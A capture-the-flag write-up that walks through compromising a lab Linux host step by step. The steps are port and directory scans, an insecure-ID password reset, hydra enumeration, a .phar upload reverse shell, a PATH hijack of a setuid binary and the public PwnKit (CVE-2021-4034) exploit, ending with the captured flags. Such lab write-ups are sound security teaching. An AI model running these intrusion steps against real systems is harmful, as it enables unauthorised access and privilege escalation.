# CTF 03
```bash
IP=192.168.10.16
```

## nmap

```bash
$ nmap -sV -Pn $IP -p-
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-13 17:55 CEST
Nmap scan report for 192.168.10.16
Host is up (0.0043s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 17.09 seconds

```

## gobuster

```bash
$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt    
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.16
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/13 17:56:24 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/config               (Status: 301) [Size: 315] [--> http://192.168.10.16/config/]
/css                  (Status: 301) [Size: 312] [--> http://192.168.10.16/css/]   
/index.php            (Status: 200) [Size: 810]                                   
/js                   (Status: 301) [Size: 311] [--> http://192.168.10.16/js/]    
/server-status        (Status: 403) [Size: 278]                                   
/upload               (Status: 301) [Size: 315] [--> http://192.168.10.16/upload/]
                                                                                  
===============================================================
2022/06/13 17:56:26 Finished
===============================================================
```

upload looks interesting

## http
`$IP:80`
apache server with php

open in browser, register an account
```
username: pascal
email: pascal@bosym.de
password: pascal
```

after login, the upload page is available, exposing a directory listing with a file called [`d.jpg`](d.jpg)

nothing in metadata

```bash
$ file d.jpg
d.jpg: JPEG image data, Exif standard: [TIFF image data, big-endian, direntries=1, orientation=upper-left], baseline, precision 8, 1280x1280, components 3

$ exiftool d.jpg
ExifTool Version Number         : 12.41
File Name                       : d.jpg
Directory                       : .
File Size                       : 172 KiB
File Modification Date/Time     : 2022:06:14 11:57:24+02:00
File Access Date/Time           : 2022:06:14 11:58:21+02:00
File Inode Change Date/Time     : 2022:06:14 11:57:35+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Orientation                     : Horizontal (normal)
Current IPTC Digest             : d41d8cd98f00b204e9800998ecf8427e
IPTC Digest                     : d41d8cd98f00b204e9800998ecf8427e
Image Width                     : 1280
Image Height                    : 1280
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1280x1280
Megapixels                      : 1.6
```

### change password

using a authenticated account and burb, you can change the password of other userids by changing the id in the post request using burp.

```
POST /dashboard.php?id=3 HTTP/1.1
Host: 192.168.10.16

password=root&id=1
```

changed the password of user 1 and 2, since my account is 3.

now find the usernames using bruteforce by creating new users. if the username exists the registration will fail:

```bash
$ hydra -L /usr/share/wordlists/simple-users.txt -p root $IP http-post-form "/register.php:username=^USER^&password=^USER^&email=^USER^%40bosym.de:Register Successful" -V
[80][http-post-form] host: 192.168.10.16   login: admin   password: root
[80][http-post-form] host: 192.168.10.16   login: admin   password: root
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-14 12:54:39
```


so username is either `admin` or `GUEST`.


when login with `admin:root` you can upload a file to the server.

## reverse shell
Sorry , Allow Ex : jpg,png,gif

it works with [`.phar`](shell.phar), for some reason.

`nc -lvp 1337`

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/
$ ls -lah /home
total 16K
drwxr-xr-x  4 root     root     4.0K Jul 16  2021 .
drwxr-xr-x 20 root     root     4.0K Jul 15  2021 ..
drwxr-xr-x  4 darkhole darkhole 4.0K Jul 17  2021 darkhole
drwxrwxrwx  5 john     john     4.0K May 15 15:40 john

$ ls -lah /home/john
total 76K
drwxrwxrwx 5 john     john     4.0K Jun 14 15:32 .
drwxr-xr-x 4 root     root     4.0K Jul 16  2021 ..
-rw------- 1 john     john     2.0K Jun 14 14:40 .bash_history
-rw-r--r-- 1 john     john      220 Jul 16  2021 .bash_logout
-rw-r--r-- 1 john     john     3.7K Jul 16  2021 .bashrc
drwx------ 2 john     john     4.0K Jul 17  2021 .cache
drwxrwxr-x 3 john     john     4.0K Jul 17  2021 .local
-rw------- 1 john     john       37 Jul 17  2021 .mysql_history
-rw-r--r-- 1 john     john      807 Jul 16  2021 .profile
drwxrwx--- 2 john     www-data 4.0K Jun 14 15:15 .ssh
-rwxrwx--- 1 john     john       33 Jun 14 15:06 file.py
-rwxrwx--- 1 john     john        8 Jul 17  2021 password
-rwsr-xr-x 1 root     root      17K Jul 17  2021 toto
-rw-rw---- 1 john     john       44 May 15 15:36 user.txt

```

there is a [`toto`](toto) binary file. Using [`objdump -d toto > disassembly.asm`](disassemly.asm) and `strings toto`, we can see, that the calls `setgid`, `setuid` and `system` are being used. When executed the result is:

```bash
$ /home/john/toto
uid=1001(john) gid=33(www-data) groups=33(www-data)
```

so it sets the uid for the `system('id')` command. From the [Linux man page](https://man7.org/linux/man-pages/man3/system.3.html) for system under caveats it says:

> Do not use system() from a privileged program (a set-user-ID or
> set-group-ID program, or a program with capabilities) because
> strange values for some environment variables might be used to
> subvert system integrity.  For example, PATH could be manipulated
> so that an arbitrary program is executed with privilege.

so we change the path variable, create a "fake" `id`, execute it and change the path back.

```bash
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

$ echo "#!/bin/bash
/bin/bash -i" > ./id

$ chmod +x id

$ PATH=/home/john ./toto

john@darkhole:/home/john$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

john@darkhole:/home/john$ cat password
root123

john@darkhole:/home/john$ cat user.txt
cyberctfd{0yjA5vhJWYkTXX2UALbw8Q7yMKqASU73}
```

now we can login via ssh with `john:root123` using `ssh john@$IP` to close the reverse shell.


## getting root

with the john user, run [linpeas](https://github.com/carlospolop/PEASS-ng) ([Output](linpeas.txt)) to search for ways to escalate privilege.

the logs show a possibility for CVE-2021-4034.

download the [PoC for PwnKit](https://github.com/arthepsy/CVE-2021-4034), compile and run it.

```bash
john@darkhole:~$ wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c
2022-06-14 16:24:48 (116 MB/s) - ‘cve-2021-4034-poc.c’ saved [1267/1267]

john@darkhole:~$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc

john@darkhole:~$ ./cve-2021-4034-poc 
# id
uid=0(root) gid=0(root) groups=0(root),1001(john)

# ls -lah /root
total 44K
drwx------  6 root root 4.0K Jul 17  2021 .
drwxr-xr-x 20 root root 4.0K Jul 15  2021 ..
-rw-------  1 root root 3.0K Jun 14 15:29 .bash_history
-rw-r--r--  1 root root 3.1K Dec  5  2019 .bashrc
drwx------  2 root root 4.0K Jul 17  2021 .cache
drwxr-xr-x  3 root root 4.0K Jul 17  2021 .local
-rw-------  1 root root   18 Jul 15  2021 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4.0K Jul 15  2021 .ssh
-rw-r--r--  1 root root   44 May 15 15:37 root.txt
drwxr-xr-x  3 root root 4.0K Jul 15  2021 snap

# cat /root/root.txt
cyberctfd{lBCz8J3tRZgCqUY3O8QQygKuIzURuLql}
```

## Flags

User: `cyberctfd{0yjA5vhJWYkTXX2UALbw8Q7yMKqASU73}`
Root: `cyberctfd{lBCz8J3tRZgCqUY3O8QQygKuIzURuLql}`